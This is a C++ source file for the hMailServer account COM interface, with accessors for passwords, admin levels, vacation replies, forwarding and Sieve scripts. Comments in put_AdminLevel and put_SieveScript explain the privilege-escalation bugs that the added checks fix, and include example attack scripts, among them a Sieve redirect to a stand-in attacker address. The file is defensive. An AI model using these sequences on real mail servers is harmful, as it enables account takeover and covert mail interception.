// Copyright (c) 2010 Martin Knafve / hMailServer.com.  
// https://www.progressiverobot.com
// Copyright (c) 2026 Christopher Holloway / Progressive Robot Ltd
#include "stdafx.h"
#include "InterfaceAccount.h"
#include "InterfaceMessages.h"
#include "InterfaceFetchAccounts.h"
#include "InterfaceAppPasswords.h"
#include "InterfaceRules.h"
#include "InterfaceIMAPFolders.h"

#include "../common/Persistence/PersistentAccount.h"
#include "../common/BO/Accounts.h"
#include "../Common/Util/Math.h"
#include "../Common/Util/PasswordValidator.h"
#include "../Common/Util/Crypt.h"
#include "../Common/Util/Time.h"
#include "../Common/Cache/AccountSizeCache.h"
#include "../Common/Sieve/SieveStorage.h"

#include "../POP3/POP3Sessions.h"
#include "../IMAP/IMAPFolderUtilities.h"
#include "../IMAP/IMAPFolderContainer.h"

#include "COMAuthentication.h"

#include "COMError.h"

#ifdef _DEBUG
#define DEBUG_NEW new(_NORMAL_BLOCK, __FILE__, __LINE__)
#define new DEBUG_NEW
#endif

using namespace HM;

#ifdef _DEBUG
   long InterfaceAccount::counter = 0;
#endif

STDMETHODIMP InterfaceAccount::InterfaceSupportsErrorInfo(REFIID riid)
{
   static const IID* arr[] = 
   {
      &IID_IInterfaceAccount,
   };

   for (int i=0;i<sizeof(arr)/sizeof(arr[0]);i++)
   {
      if (InlineIsEqualGUID(*arr[i],riid))
         return S_OK;
   }
   return S_FALSE;
}

void
InterfaceAccount::SetAuthentication(std::shared_ptr<HM::COMAuthentication> pAuthentication)
{
   authentication_ = pAuthentication;
}

STDMETHODIMP InterfaceAccount::get_Active(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetActive() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Active(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetActive(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ADDomain(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetADDomain().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ADDomain(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetADDomain(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Address(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAddress().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Address(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      HM::String sAddress = newVal;
      sAddress.Trim();
   
      object_->SetAddress(sAddress);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_DomainID(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (long) object_->GetDomainID();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_DomainID(LONG newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Only here for backwards compatibility (4.x)
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_IsAD(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (object_->GetIsAD())
         *pVal = VARIANT_TRUE;
      else
         *pVal = VARIANT_FALSE;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_IsAD(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetIsAD(newVal == VARIANT_TRUE);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Password(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetPassword().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_Password(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The password isn't encrypted. Encrypt it now using MD5.
      int preferredHashAlgorithm = HM::IniFileSettings::Instance()->GetPreferredHashAlgorithm();
      String sPassword = HM::Crypt::Instance()->EnCrypt(newVal, (HM::Crypt::EncryptionType) preferredHashAlgorithm);
   
      object_->SetPassword(sPassword);
      object_->SetPasswordEncryption(preferredHashAlgorithm);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Size(float *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      float fMB = (1024*1024);
   
      __int64 accountSizeBytes = AccountSizeCache::Instance()->GetSize(object_->GetID());
   
      *pVal = HM::Math::Round((float) accountSizeBytes / fMB,3);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::Save()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Only server administrators have access to change settings for server administrators.
      // Without this check, a domain administrator could change the settings for a server administrator, such
      // as his password and the log on as server administrator.
      // (This would only be possible if the server admin is added as a user to a domain which the domain admin
      // is domain administrator for).
      if (!authentication_->GetIsServerAdmin())
      {
         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
         {
            return COMError::GenerateError("You do not have access to save the user account. Server administrator accounts can only be updated by server administrators.");
         }
      }


      String sErrorMessage;
      if (PersistentAccount::SaveObject(object_, sErrorMessage, true, HM::PersistenceModeNormal))
      {
         // Add to parent collection
         AddToParentCollection();
   
         return S_OK;
      }
   
      return COMError::GenerateError("Failed to save object. " +  sErrorMessage);
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::UnlockMailbox()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      __int64 iAccountID = object_->GetID();
      POP3Sessions::Instance()->Unlock(iAccountID);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::ValidatePassword(BSTR Password, VARIANT_BOOL *pCorrect)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pCorrect = HM::PasswordValidator::ValidatePassword(object_, Password) ? VARIANT_TRUE : VARIANT_FALSE; 
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ADUsername(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetADUsername().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ADUsername(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetADUsername(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::DeleteMessages()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      PersistentAccount::DeleteMessages(object_);
   
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Messages(IInterfaceMessages **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceMessages>* pMessages = new CComObject<InterfaceMessages>();
      pMessages->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::Messages> pMsgs = object_->GetMessages();
   
      if (!pMsgs)
         return DISP_E_BADINDEX;  
   
      pMessages->Attach(pMsgs);
      pMessages->AddRef();
      *pVal = pMessages;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_MaxSize(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetAccountMaxSize();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_MaxSize(long pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      object_->SetAccountMaxSize(pVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageIsOn(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = PersistentAccount::GetIsVacationMessageOn(object_) ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageIsOn(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationMessageIsOn(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessage(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

   
      *pVal = object_->GetVacationMessage().AllocSysString();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessage(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationMessage(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationSubject(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

   
      *pVal = object_->GetVacationSubject().AllocSysString();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationSubject(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationSubject(newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageExpires(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationExpires() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageExpires(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationExpires(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageExpiresDate(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationExpiresDate().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageExpiresDate(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::String string = newVal;
      
      // Validate input date.
      if (string.Left(4) == _T("0000"))
         string = "";
   
      if (string.GetLength() == 0)
         string = Time::GetCurrentDate();
      else if (string.GetLength() != 10 || !Time::IsValidSystemDate(string))
         return COMError::GenerateError("Invalid auto-reply expiry date");
   
      object_->SetVacationExpiresDate(string);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageBeginDate(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationBeginDate().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageBeginDate(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::String string = newVal;

      // The same validation the expiry date gets: an empty or zeroed value means
      // "from today", which is the no-scheduling behaviour every account had
      // before this property existed.
      if (string.Left(4) == _T("0000"))
         string = "";

      if (string.GetLength() == 0)
         string = Time::GetCurrentDate();
      else if (string.GetLength() != 10 || !Time::IsValidSystemDate(string))
         return COMError::GenerateError("Invalid auto-reply begin date");

      object_->SetVacationBeginDate(string);

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_VacationMessageAbortSpamFlagged(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetVacationAbortSpamFlagged() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_VacationMessageAbortSpamFlagged(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetVacationAbortSpamFlagged(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AppPasswords(IInterfaceAppPasswords **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceAppPasswords>* pItem = new CComObject<InterfaceAppPasswords>();
      pItem->SetAuthentication(authentication_);

      std::shared_ptr<HM::AppPasswords> passwords = std::shared_ptr<HM::AppPasswords>(new HM::AppPasswords());

      passwords->Refresh(object_->GetID());

      pItem->Attach(passwords, object_->GetID());
      pItem->AddRef();
      *pVal = pItem;

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_FetchAccounts(IInterfaceFetchAccounts **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceFetchAccounts>* pItem = new CComObject<InterfaceFetchAccounts >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::FetchAccounts> pFetchAccounts = std::shared_ptr<HM::FetchAccounts>(new HM::FetchAccounts(object_->GetID()));
   
      pFetchAccounts->Refresh();
   
      if (pFetchAccounts)
      {
         pItem->Attach(pFetchAccounts);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_AdminLevel(eAdminLevel *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = (eAdminLevel) object_->GetAdminLevel();
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_AdminLevel(eAdminLevel newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Above the switch, deliberately: this asks about the account being MODIFIED, not
      // about the level being assigned, so it must hold on every path through this
      // function.
      //
      // Save() carries a check for the same thing - "Only server administrators have
      // access to change settings for server administrators" - and its comment describes
      // the attack it was meant to stop: a server admin whose mailbox sits in a domain
      // somebody else administers. But it asks object_->GetAdminLevel(), the IN-MEMORY
      // value this setter has already overwritten, and nothing re-reads the stored one.
      // So the guard was defeated by the property assignment that precedes it:
      //
      //    acct = domain.Accounts.ItemByAddress("boss@corp.com")  // a server admin
      //    acct.AdminLevel = 0        // object_ becomes Normal
      //    acct.Password = "..."
      //    acct.Save()                // guard reads Normal, allows both writes
      //
      // A domain administrator could demote the server administrator and set their
      // password in three lines. Refusing the change here is what makes Save()'s check
      // reachable again: with the level unchanged it still reads ServerAdmin, so the
      // password write is refused too.
      //
      // Putting this inside the Normal/DomainAdmin case - where it first went - was not
      // enough. eAdminLevel is a COM enum, which is to say a long, and neither COM
      // automation nor a vtable call range-checks it. The switch below has no default,
      // so a value matching no case fell straight through to SetAdminLevel() and set the
      // level to something that is neither ServerAdmin nor a valid level at all:
      //
      //    acct.AdminLevel = 3        // matches no case, guard never evaluated
      //    acct.Password = "..."
      //    acct.Save()                // 3 == ServerAdmin(2) is false, both writes allowed
      //
      // which is the same takeover by a different door, and PersistentAccount::SaveObject
      // would have written the 3 to accountadminlevel without validating it either.
      if (object_->GetAdminLevel() == HM::Account::ServerAdmin &&
          !authentication_->GetIsServerAdmin())
         return authentication_->GetAccessDenied();

      // Check that the user has permission to do this change.
      switch (newVal)
      {
      case hAdminLevelNormal:
      case hAdminLevelDomainAdmin:
         {
            // The client wants to give this user normal or domain level
            // rights. This is OK if the user is domain or server admin.
            if (!authentication_->GetIsDomainAdmin() && !authentication_->GetIsServerAdmin())
               return authentication_->GetAccessDenied();

            break;
         }
      case hAdminLevelServerAdmin:
         {
            if (object_->GetAdminLevel() == hAdminLevelServerAdmin)
            {
               // It's OK to set this user to admin since the user already is admin. We
               // don't need to change anything.
               return S_OK;
            }

            if (!authentication_->GetIsServerAdmin())
            {
               // Only server admins are allowed to give other users server admin rights.
               return authentication_->GetAccessDenied();
            }

            break;
         }
      default:
         {
            // Anything else is not an admin level. Refused rather than stored, both
            // because the value would be meaningless in accountadminlevel and because
            // silently accepting it is what let the guard above be walked around.
            return COMError::GenerateError("The specified administration level is not valid.");
         }
      }
   
   
      object_->SetAdminLevel((HM::Account::AdminLevel) newVal);
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_Rules(IInterfaceRules **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      CComObject<InterfaceRules >* pItem = new CComObject<InterfaceRules >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::Rules> pRules = object_->GetRules();
   
      if (pRules)
      {
         pItem->Attach(pRules);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_IMAPFolders(IInterfaceIMAPFolders **pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (object_->GetID() == 0)
         return DISP_E_BADINDEX;  
   
      CComObject<InterfaceIMAPFolders>* pItem = new CComObject<InterfaceIMAPFolders >();
      pItem->SetAuthentication(authentication_);
   
      std::shared_ptr<HM::IMAPFolders> pFolders = HM::IMAPFolderContainer::Instance()->GetFoldersForAccount(object_->GetID());
   
      if (pFolders)
      {
         pItem->Attach(pFolders);
         pItem->AddRef();
         *pVal = pItem;
      }
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP 
InterfaceAccount::get_QuotaUsed(long *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      __int64 accountSizeBytes = AccountSizeCache::Instance()->GetSize(object_->GetID());
   
      __int64 iMaxSize = ((__int64) object_->GetAccountMaxSize()) * 1024; // Convert from MB to KB
      __int64 iCurrentSize = accountSizeBytes / 1024; // Convert from Bytes to KB
   
      int iPercentageUsed = 0;
      
      if (iMaxSize > 0)
         iPercentageUsed = (int) (((float) iCurrentSize/ (float) iMaxSize) * 100);
   
      *pVal = iPercentageUsed;
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardEnabled() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardEnabled(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardAddress(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardAddress().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardAddress(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardAddress(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SieveScript(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // Sieve scripts are stored as files keyed by the account address, so this
      // property reads directly from SieveStorage (no Save() required).
      *pVal = HM::SieveStorage::GetActiveScript(object_->GetAddress()).AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SieveScript(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      // The script is persisted to disk immediately (file-backed, not part of the
      // account row), so this does not require a subsequent Save() - and that is
      // exactly why it needs its own guard.
      //
      // Save() carries the check that stops a domain administrator altering a server
      // administrator's account, for the case its comment describes: a server admin
      // whose mailbox sits inside a domain somebody else administers. Every other
      // sensitive property on this interface is written to object_ and therefore
      // reaches that check. This one goes straight to the filesystem and bypassed it
      // completely.
      //
      // A domain administrator could therefore install
      //
      //    require ["copy"]; redirect :copy "attacker@example.test";
      //
      // on the server administrator's account and receive a copy of all their mail.
      // LocalDelivery reads that file on every delivery, so it takes effect at once,
      // with no save and nothing to review. The same account's password could not be
      // changed - only its mail could be redirected, which is worse.
      if (!authentication_->GetIsServerAdmin())
      {
         if (object_->GetAdminLevel() == HM::Account::ServerAdmin)
            return COMError::GenerateError("You do not have access to change the Sieve script of a server administrator account. Server administrator accounts can only be updated by server administrators.");
      }

      // Reported rather than discarded: SetActiveScript returns whether the file was
      // written, and a disk-full or permission failure otherwise left the caller
      // believing the filter was installed while mail kept being delivered unfiltered.
      if (!HM::SieveStorage::SetActiveScript(object_->GetAddress(), HM::String(newVal)))
         return COMError::GenerateError("The Sieve script could not be written to disk. Check the hMailServer error log.");

      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardKeepOriginal(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardKeepOriginal() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardKeepOriginal(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardKeepOriginal(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_ForwardAbortSpamFlagged(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal = object_->GetForwardAbortSpamFlagged() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_ForwardAbortSpamFlagged(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetForwardAbortSpamFlagged(newVal == VARIANT_TRUE);
      return S_OK;   
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignatureEnabled(VARIANT_BOOL *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetEnableSignature() ? VARIANT_TRUE : VARIANT_FALSE;
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignatureEnabled(VARIANT_BOOL newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetEnableSignature(newVal == VARIANT_TRUE);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignaturePlainText(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetSignaturePlainText().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignaturePlainText(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSignaturePlainText(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_SignatureHTML(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetSignatureHTML().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_SignatureHTML(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetSignatureHTML(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PersonFirstName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetPersonFirstName().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_PersonFirstName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetPersonFirstName(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_PersonLastName(BSTR *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      *pVal  = object_->GetPersonLastName().AllocSysString();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::put_PersonLastName(BSTR newVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      object_->SetPersonLastName(newVal);
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::get_LastLogonTime(VARIANT *pVal)
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      HM::DateTime dt = Time::GetDateFromSystemDate(object_->GetLastLogonTime());
      
      *pVal  = dt.GetVariant();
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

STDMETHODIMP InterfaceAccount::Delete()
{
   try
   {
      if (!object_)
         return GetAccessDenied();

      if (!authentication_->GetIsDomainAdmin())
         return authentication_->GetAccessDenied();
   
      if (!parent_collection_)
         return PersistentAccount::DeleteObject(object_) ? S_OK : S_FALSE;
   
      parent_collection_->DeleteItemByDBID(object_->GetID());
   
      return S_OK;
   }
   catch (...)
   {
      return COMError::GenerateGenericMessage();
   }
}

